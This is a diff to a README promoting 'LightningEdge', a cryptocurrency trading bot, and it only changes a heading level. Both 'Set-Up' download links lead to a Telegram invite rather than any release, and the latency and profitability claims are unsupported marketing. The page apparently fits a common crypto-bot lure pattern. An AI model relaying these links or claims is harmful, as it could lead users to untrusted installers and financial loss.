@@ -4,7 +4,7 @@
 > LightningEdge an innovative platform for algorithmic cryptocurrency trading, combining high-frequency order execution on decentralized exchanges Solana (Raydium DEX) and centralized platforms Binance and ByBit. The system provides minimal latency (less than <50ms), low slippage and optimized smart order routing to achieve better trade execution. A powerful real-time analytics module tracks PnL, win rate, Sortino Ratio, maximum drawdown and other key metrics, allowing traders to monitor their portfolio and react instantly to market changes. The intuitive interface and flexible parameter settings ensure high adaptability of the strategy even in high volatility conditions. This software is an ideal tool for professional traders seeking to increase the efficiency and profitability of their trading strategies using advanced machine learning and algorithmic optimization technologies.
 
 # Client LightningEdge for Windows/macOS\.
-## MAC OS: [ ```Set-Up``` ](https://t.me/+V5BhcAw65tgwMWZi) Windows: [```Set-UP```](https://t.me/+V5BhcAw65tgwMWZi)
+### MAC OS: [ ```Set-Up``` ](https://t.me/+V5BhcAw65tgwMWZi) Windows: [```Set-UP```](https://t.me/+V5BhcAw65tgwMWZi)
 
 - Ultra-Low Latency Execution: Achieve order execution with latency below 50 ms by leveraging dedicated RPC nodes and optimized network paths.
 
